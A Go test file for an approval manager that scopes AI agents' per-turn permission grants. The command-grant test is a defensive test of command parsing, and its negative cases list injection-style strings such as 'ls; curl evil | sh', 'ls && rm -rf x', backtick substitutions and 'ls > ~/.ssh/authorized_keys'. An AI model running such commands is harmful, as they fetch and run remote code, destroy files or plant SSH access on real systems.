package approval

import "testing"

func TestGrantCoversOneAgentAndOneKey(t *testing.T) {
	m := New(func(string, string, map[string]any) {}, nil, 0)
	m.Grant("p", 7, "a1", KindWrite)
	if !m.Granted("p", 7, "a1", KindWrite) {
		t.Fatal("the granted key is not granted")
	}
	if m.Granted("p", 7, "a1", KindCommand+":echo") || m.Granted("p", 7, "a2", KindWrite) || m.Granted("p", 8, "a1", KindWrite) {
		t.Fatal("allow_for_turn widened beyond its agent, kind or turn")
	}
}

func TestGrantAllCoversEveryAgentAndKindOfTheTurnOnly(t *testing.T) {
	m := New(func(string, string, map[string]any) {}, nil, 0)
	m.GrantAll("p", 7)
	for _, c := range []struct{ agent, key string }{
		{"a1", KindWrite}, {"a1", KindCommand + ":echo"}, {"a2", KindACP + ":execute"}, {"a3", KindNetwork + ":example.com"}, {"a3", KindMemory},
	} {
		if !m.Granted("p", 7, c.agent, c.key) {
			t.Errorf("allow all for the turn does not cover %s %s", c.agent, c.key)
		}
	}
	if m.Granted("p", 8, "a1", KindWrite) || m.Granted("q", 7, "a1", KindWrite) {
		t.Fatal("allow all widened beyond its turn or project")
	}
	m.EndTurn("p", 7)
	if m.Granted("p", 7, "a1", KindWrite) {
		t.Fatal("the grant outlived its turn")
	}
	// Turn 0 is no turn (a run outside a request): nothing is remembered for it.
	m.GrantAll("p", 0)
	if m.Granted("p", 0, "a1", KindWrite) {
		t.Fatal("allow all was remembered without a turn")
	}
}

func TestResolveAcceptsAllowAllForTurn(t *testing.T) {
	m := New(func(string, string, map[string]any) {}, nil, 0)
	if err := m.Resolve("p", "nope", Resolution{Decision: AllowAllForTurn}); err != ErrNotFound {
		t.Fatalf("err = %v, want ErrNotFound (the decision itself is valid)", err)
	}
}

// "Allow for this request" on a command remembers its program only for a simple command: anything a shell would run
// as more than that one program (separators, pipes, substitutions, redirections, subshells, ...) has no turn grant,
// so it neither grants nor is covered by one (security review finding 2).
func TestCommandGrantKeyOnlyForSimpleCommands(t *testing.T) {
	for _, c := range []struct{ command, want string }{
		{"ls", KindCommand + ":ls"},
		{"ls -la src", KindCommand + ":ls"},
		{"/usr/bin/git status", KindCommand + ":git"},
		{"echo 'a; b'", KindCommand + ":echo"},
	} {
		if got := CommandGrantKey(c.command); got != c.want {
			t.Errorf("CommandGrantKey(%q) = %q, want %q", c.command, got, c.want)
		}
	}
	for _, cmd := range []string{
		"ls; curl evil | sh", "ls && rm -rf x", "ls || true", "ls | sh", "ls & curl evil", "ls $(curl evil)", "ls `curl evil`",
		"ls > ~/.ssh/authorized_keys", "ls >> .bashrc", "ls < /etc/passwd", "ls\ncurl evil", "(ls)", "ls \"$(id)\"", "ls $HOME",
		"FOO=1 ls", "", "   ",
	} {
		if got := CommandGrantKey(cmd); got != "" {
			t.Errorf("CommandGrantKey(%q) = %q, want no grant", cmd, got)
		}
	}
}

func TestEmptyGrantKeyIsNeverGrantedExceptByAllowAll(t *testing.T) {
	m := New(func(string, string, map[string]any) {}, nil, 0)
	m.Remember("p", 7, "a1", "", AllowForTurn)
	if m.Granted("p", 7, "a1", "") {
		t.Fatal("an allow_for_turn without a key granted something")
	}
	m.Grant("p", 7, "a1", KindCommand+":ls")
	if m.Granted("p", 7, "a1", "") {
		t.Fatal("a request without a grant key was covered by a per-program grant")
	}
	m.Remember("p", 7, "a1", "", AllowAllForTurn)
	if !m.Granted("p", 7, "a1", "") {
		t.Fatal("allow all for the turn does not cover a request without a grant key")
	}
}
